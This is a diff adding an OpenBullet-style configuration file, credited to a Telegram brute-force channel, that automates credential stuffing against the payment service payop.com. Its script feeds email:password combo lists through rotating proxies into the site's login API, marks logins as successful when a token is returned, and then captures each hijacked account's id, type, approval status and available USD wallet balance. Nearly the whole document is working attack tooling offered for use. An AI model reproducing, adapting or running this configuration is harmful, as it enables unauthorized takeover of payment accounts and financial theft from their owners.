@@ -1,0 +1,103 @@
+[SETTINGS]
+{
+  "Name": "Payop.Com",
+  "SuggestedBots": 100,
+  "MaxCPM": 0,
+  "LastModified": "2020-08-10T17:14:50.7832065+04:30",
+  "AdditionalInfo": "Telegram Channel: @BruteForce | Capture | HighCPN |",
+  "Author": "@TheOwn",
+  "Version": "1.4.4 [Anomaly]",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": true,
+  "EncodeData": false,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "CaptchaUrl": "",
+  "Base64": "",
+  "Grayscale": false,
+  "RemoveLines": false,
+  "RemoveNoise": false,
+  "Dilate": false,
+  "Threshold": 1.0,
+  "DiffKeep": 0.0,
+  "DiffHide": 0.0,
+  "Saturate": false,
+  "Saturation": 0.0,
+  "Transparent": false,
+  "Contour": false,
+  "OnlyShow": false,
+  "ContrastGamma": false,
+  "Contrast": 1.0,
+  "Gamma": 1.0,
+  "Brightness": 1.0,
+  "RemoveLinesMin": 0,
+  "RemoveLinesMax": 0,
+  "Crop": false,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+#Lenght FUNCTION Length "{\"email\":\"<USER>\",\"password\":\"<PASS>\"}" -> VAR "Lenght" 
+
+#Post REQUEST POST "https://payop.com/v1/users/login" 
+  CONTENT "{\"email\":\"<USER>\",\"password\":\"<PASS>\"}" 
+  CONTENTTYPE "application/json" 
+  HEADER ": scheme: https" 
+  HEADER "accept: application/json, text/plain, */*" 
+  HEADER "accept-encoding: gzip, deflate, br" 
+  HEADER "accept-language: en-US,en;q=0.9,fa;q=0.8" 
+  HEADER "cache-control: no-cache" 
+  HEADER "content-length: <Lenght>" 
+  HEADER "origin: https://payop.com" 
+  HEADER "pragma: no-cache" 
+  HEADER "referer: https://payop.com/en/auth/login" 
+  HEADER "sec-fetch-dest: empty" 
+  HEADER "sec-fetch-mode: cors" 
+  HEADER "sec-fetch-site: same-origin" 
+  HEADER "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.105 Safari/537.36" 
+  HEADER "x-requested-with: XMLHttpRequest" 
+
+KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "User not found" 
+  KEYCHAIN Success OR 
+    KEY "<HEADERS>" Contains "token" 
+  KEYCHAIN Custom "CUSTOM" OR 
+    KEY "This value is not a valid email address." 
+
+#token PARSE "<HEADERS(token)>" LR "" "" -> VAR "token" 
+
+PARSE "<SOURCE>" JSON "id" CreateEmpty=FALSE -> CAP "id" 
+
+#accountType PARSE "<SOURCE>" JSON "accountType" CreateEmpty=FALSE -> CAP "accountType" 
+
+#approvedStatus PARSE "<SOURCE>" JSON "approvedStatus" CreateEmpty=FALSE -> CAP "approvedStatus" 
+
+#GetCap REQUEST GET "https://payop.com/v1/wallets/available-amounts-for-currency/USD" 
+  
+  HEADER ": scheme: https" 
+  HEADER "accept: application/json, text/plain, */*" 
+  HEADER "accept-encoding: gzip, deflate, br" 
+  HEADER "accept-language: en-US,en;q=0.9,fa;q=0.8" 
+  HEADER "cache-control: no-cache" 
+  HEADER "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.105 Safari/537.36" 
+  HEADER "x-requested-with: XMLHttpRequest" 
+  HEADER "token: <token>" 
+
+#amount PARSE "<SOURCE>" JSON "amount" Recursive=TRUE CreateEmpty=FALSE -> CAP "amount" 
+
+#recalculationMoney PARSE "<SOURCE>" JSON "recalculationMoney" Recursive=TRUE CreateEmpty=FALSE -> CAP "recalculationMoney" 
+
